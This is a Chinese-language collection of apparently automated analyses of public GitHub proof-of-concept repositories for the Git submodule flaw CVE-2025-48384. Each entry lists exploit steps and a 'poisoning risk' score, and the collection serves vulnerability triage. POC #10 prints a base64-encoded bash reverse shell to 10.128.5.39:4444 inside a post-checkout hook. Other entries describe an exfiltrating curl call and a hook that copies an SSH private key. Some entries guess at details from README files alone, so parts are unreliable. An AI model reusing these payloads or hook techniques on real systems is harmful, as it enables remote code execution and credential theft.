根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

